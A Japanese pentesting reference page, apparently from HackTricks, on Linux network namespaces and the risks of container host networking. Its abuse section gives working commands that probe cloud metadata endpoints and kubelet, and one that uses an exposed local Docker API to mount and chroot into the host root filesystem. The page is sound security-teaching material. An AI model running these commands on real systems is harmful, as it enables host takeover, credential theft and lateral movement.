# ネットワーク名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

ネットワーク名前空間は、インターフェース、IPアドレス、ルーティングテーブル、ARP/neighbor状態、ファイアウォールルール、ソケット、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、自身のように見える `eth0`、独自のローカルルート、およびループバックデバイスを持つことができます。

セキュリティの観点では、ネットワーク分離は単なるポートバインディング以上の意味を持ちます。プライベートなネットワーク名前空間は、ワークロードが直接観測したり再設定したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナは突然ホストのリスナー、ホストローカルサービス、そしてアプリケーションに露出されるべきではなかったネットワークの制御ポイントを可視化できるようになる可能性があります。

## 動作

新しく作成されたネットワーク名前空間は、インターフェースがアタッチされるまで空またはほぼ空のネットワーク環境で始まります。コンテナランタイムはその後、仮想インターフェースを作成または接続し、アドレスを割り当て、ルートを設定してワークロードに期待される接続性を提供します。bridgeベースのデプロイでは、通常コンテナはホストのbridgeに接続された veth バックのインターフェースを見ます。Kubernetes では、CNI プラグインが Pod ネットワーキングの同等のセットアップを処理します。

このアーキテクチャは、`--network=host` や `hostNetwork: true` がこれほど大きな変化である理由を説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加することになります。

## ラボ

次のコマンドでほぼ空のネットワーク名前空間を確認できます:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナとホストネットワーク化されたコンテナを比較できます:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
ホストネットワークを使用するコンテナは、もはや独立したソケットやインターフェースのビューを持ちません。その変更だけでも、プロセスがどんな権限を持っているかを問う前から重大です。

## 実行時の利用

Docker と Podman は通常、特別な設定がない限り各コンテナごとにプライベートな network namespace を作成します。Kubernetes は通常、各 Pod に対してホストとは別の独自の network namespace を割り当て、Pod 内のコンテナ間で共有します。Incus/LXC システムも多様な仮想ネットワーク構成を伴う、network-namespace ベースの隔離機能を提供します。

共通する原則は、プライベートなネットワーキングがデフォルトの隔離境界であり、ホストネットワークの使用はその境界を明示的に解除するものだ、ということです。

## 誤設定

最も重要な誤設定は、単にホストの network namespace を共有することです。これは性能向上、低レベルの監視、または利便性のために行われることがありますが、コンテナにとって利用可能な最も明確な境界の一つを取り除いてしまいます。ホスト上のローカルリスナーがより直接的に到達可能になり、localhost 専用のサービスがアクセス可能になる場合があり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような権限は、これらが有効にする操作がホストのネットワーク環境に対して適用されるため、はるかに危険になります。

もう一つの問題は、network namespace がプライベートであってもネットワーク関連の権限を過剰に付与してしまうことです。プライベートな namespace は助けになりますが、raw socket や高度なネットワーク制御が無害になるわけではありません。

## 悪用

隔離が弱い環境では、攻撃者はホストでリッスンしているサービスを調べたり、loopback にバインドされた管理エンドポイントに到達したり、具体的な権限や環境に応じてトラフィックをスニッフィング／妨害したり、`CAP_NET_ADMIN` がある場合はルーティングやファイアウォールの状態を再設定したりする可能性があります。クラスタでは、これにより横方向の移動やコントロールプレーンの偵察が容易になることもあります。

もしホストネットワーキングが疑われる場合は、まず表示されているインターフェースやリスナーが隔離されたコンテナのネットワークではなくホストに属していることを確認してください:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services は、しばしば最初に発見される興味深い対象です:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
ネットワークのcapabilitiesが存在する場合、ワークロードが表示されているスタックを検査または変更できるかをテストする:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
cluster や cloud 環境では、host networking により、metadata や control-plane-adjacent services の迅速な local recon が妥当です：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完全な例: ホストネットワーキング + ローカルランタイム / Kubelet へのアクセス

ホストネットワーキングは自動的にホストの root を提供するわけではありませんが、多くの場合ノード自身からのみ到達可能に意図されたサービスを公開しています。これらのサービスのうち1つが脆弱に保護されている場合、ホストネットワーキングは直接的な privilege-escalation の経路になります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet が localhost 上で動作:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響:

- 適切な保護がない状態でローカルランタイム API が公開されている場合、ホストが直接侵害される
- kubelet またはローカルエージェントに到達可能な場合、クラスタの偵察や横移動につながる可能性がある
- `CAP_NET_ADMIN` と組み合わせると、トラフィックの操作や denial of service を引き起こす可能性がある

## チェック

これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートやリスナーが見えているか、そして capabilities をテストする前にネットワークの見え方が既にホストのようになっているかどうかを把握することです。
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
興味深い点:

- ネームスペース識別子や表示されるインターフェイスセットがホストと似ている場合、ホストネットワーキングが既に使用されている可能性がある。
- `ss -lntup` は特に有用で、ループバックのみのリスナーやローカル管理用エンドポイントを明らかにする。
- `CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合、ルート、インターフェイス名、およびファイアウォールのコンテキストがより重要になる。

コンテナを確認する際は、必ずネットワークネームスペースを capability セットと合わせて評価してください。ホストネットワーキングと強力なネットワーク capability の組み合わせは、ブリッジネットワーキングと限定的なデフォルト capability セットとはまったく異なる姿勢です。
